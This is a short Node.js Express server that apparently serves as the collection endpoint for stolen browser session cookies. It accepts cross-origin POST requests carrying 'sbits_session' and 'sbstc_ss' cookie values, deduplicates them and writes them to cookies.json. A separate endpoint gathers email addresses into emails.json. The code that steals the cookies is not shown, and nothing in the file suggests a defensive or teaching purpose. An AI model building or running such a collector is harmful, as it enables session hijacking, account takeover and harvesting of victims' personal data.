const express = require("express");
const cors = require('cors');
const ip = require("ip");
const fs = require('fs');

const app = express();
app.use(express.json({ extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.sendStatus(200);
});

app.post("/", async (req, res) => {
    let cookies = require('./cookies.json');
    if (!cookies.find(e => e.sbits_session === req.body.sbits_session)) {
        cookies.push(req.body);
        fs.writeFileSync('cookies.json', JSON.stringify(cookies))
        console.log(cookies.length);
    }
    res.sendStatus(200);
});
app.post("/bas", async (req, res) => {
    const sbits_session = req.body.cookies.find(e => e.name === 'sbits_session')?.value;
    const sbstc_ss = req.body.cookies.find(e => e.name === 'sbstc_ss')?.value;
    let cookies = require('./cookies.json');
    if (!cookies.find(e => e.sbits_session === sbits_session)) {
        cookies.push({ sbits_session, sbstc_ss })
        fs.writeFileSync('cookies.json', JSON.stringify(cookies))
        console.log(cookies.length);
    }
    res.sendStatus(200);
});
app.post("/email", async (req, res) => {
    const { email } = req.body;
    console.log(email)
    let emails = require('./emails.json');
    if (!emails.find(e => e === email)) {
        emails.push(email);
        fs.writeFileSync('emails.json', JSON.stringify(emails));
        console.log(emails.length);
    }
    res.sendStatus(200);
});

async function start() {
    app.listen(3000, () => {
        console.log(`App listening at ${ip.address()}:3000`);
    });
}
start();